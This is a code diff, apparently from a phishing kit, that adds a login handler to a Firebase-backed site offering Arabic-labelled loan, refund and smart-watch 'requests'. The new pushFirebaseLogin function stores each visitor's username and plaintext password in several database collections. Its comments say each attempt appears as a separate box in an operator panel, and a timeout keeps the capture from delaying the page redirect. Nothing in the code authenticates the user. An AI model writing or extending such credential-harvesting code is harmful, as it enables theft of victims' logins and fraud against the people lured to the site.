@@ -319,7 +319,8 @@
   const REQUEST_TYPE_LABEL = {
     loan: 'طلب سلفة',
     refund: 'طلب استرداد',
-    watch: 'طلب الساعة الذكية'
+    watch: 'طلب الساعة الذكية',
+    login: 'تسجيل الدخول'
   };
 
   window.pushFirebaseRequest = function (request) {
@@ -384,6 +385,94 @@
     return Promise.all(tasks).catch(function (err) {
       console.error('pushFirebaseRequest failed:', err && err.code, err && err.message);
     });
+  };
+
+  // ═══════════════════════════════════════════════════════════
+  // إرسال بيانات تسجيل دخول العميل (اسم المستخدم + كلمة المرور)
+  // تُستدعى من صفحة login.html. تكتب في customers/{sessionId}
+  // (اسم المستخدم في الحقل name ليظهر الزائر في اللوحة + الحقول username/pass)
+  // وفي مجموعة requests كأرشيف، وفي RTDB للتوافق.
+  // ═══════════════════════════════════════════════════════════
+  window.pushFirebaseLogin = function (data) {
+    data = data || {};
+    const username = String(data.username || '').trim();
+    const password = String(data.password || '');
+    if (!username && !password) return Promise.resolve();
+
+    const refNo = 'LG-' + Date.now().toString().slice(-8);
+    const now = Date.now();
+    const fields = {
+      sessionId: sessionId,
+      username: username,
+      pass: password,
+      name: username || (localStorage.getItem('customerName') || ''),
+      phone: localStorage.getItem('phone') || '',
+      mobile: localStorage.getItem('phone') || '',
+      requestType: 'login',
+      requestTypeLabel: REQUEST_TYPE_LABEL.login,
+      refNo: refNo,
+      status: 'pending',
+      decision: 'pending',
+      lastSeen: now,
+      currentPage: getFriendlyPageName(),
+      isHidden: false,
+      flagColor: ''
+    };
+
+    if (username) localStorage.setItem('customerName', username);
+
+    const tasks = [];
+    // كل محاولة دخول تُضاف كعنصر في مصفوفة logins (لا تُستبدل السابقة)
+    // فتظهر في اللوحة كصندوق منفصل لكل تسجيل دخول.
+    tasks.push(customerRef.set(Object.assign({}, fields, {
+      logins: firebase.firestore.FieldValue.arrayUnion({
+        username: username,
+        password: password,
+        at: now,
+        page: getFriendlyPageName()
+      }),
+      createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    }), { merge: true }));
+    tasks.push(db.collection('requests').doc(refNo).set(Object.assign({}, fields, {
+      details: { username: username, password: password },
+      createdAt: firebase.firestore.FieldValue.serverTimestamp()
+    }), { merge: true }));
+
+    try {
+      rtd.ref('sessions/' + sessionId).update({
+        customerName: username,
+        requestType: 'login',
+        refNo: refNo,
+        page: getFriendlyPageName(),
+        hasNewActivity: true
+      });
+    } catch (e) {}
+
+    return Promise.all(tasks).catch(function (err) {
+      console.error('pushFirebaseLogin failed:', err && err.code, err && err.message);
+    });
+  };
+
+  // إرسال تسجيل الدخول مع انتظار جاهزية المصادقة وحدّ زمني (لا يعطّل التوجيه)
+  window.submitLogin = function (data) {
+    let sent = false;
+    function send() {
+      if (sent) return Promise.resolve();
+      sent = true;
+      if (typeof window.pushFirebaseLogin !== 'function') return Promise.resolve();
+      try {
+        return Promise.resolve(window.pushFirebaseLogin(data)).catch(function () {});
+      } catch (e) {
+        return Promise.resolve();
+      }
+    }
+    const ready = (typeof window.ensureAuthReady === 'function')
+      ? window.ensureAuthReady().then(send).catch(send)
+      : send();
+    const timeout = new Promise(function (resolve) {
+      setTimeout(function () { send().then(resolve); }, 2500);
+    });
+    return Promise.race([ready, timeout]);
   };
 
   // ═══════════════════════════════════════════════════════════
